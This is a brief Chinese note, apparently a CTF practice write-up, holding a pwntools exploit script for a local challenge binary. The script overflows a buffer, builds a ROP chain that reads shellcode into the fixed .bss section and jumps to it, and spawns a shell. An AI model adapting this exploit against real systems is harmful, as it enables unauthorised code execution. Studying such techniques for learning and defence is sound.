# pwntools---rop示例

```python
# coding:utf8

from pwn import *

shellcode = asm(shellcraft.sh())
proc = './static'
context.binary = proc
elf = ELF(proc)

p = process(proc)
p.recvuntil('Welcome to zsctf!')

rop = ROP(proc)
rop.read(0, elf.bss(0x100), len(shellcode))
rop.call(elf.bss(0x100))

p.send('a'*20 + str(rop))
p.send(shellcode)
```

因为bss段地址固定，而且程序的NX保护没开，所以可以直接写bss段  执行命令  


2019/11/8  
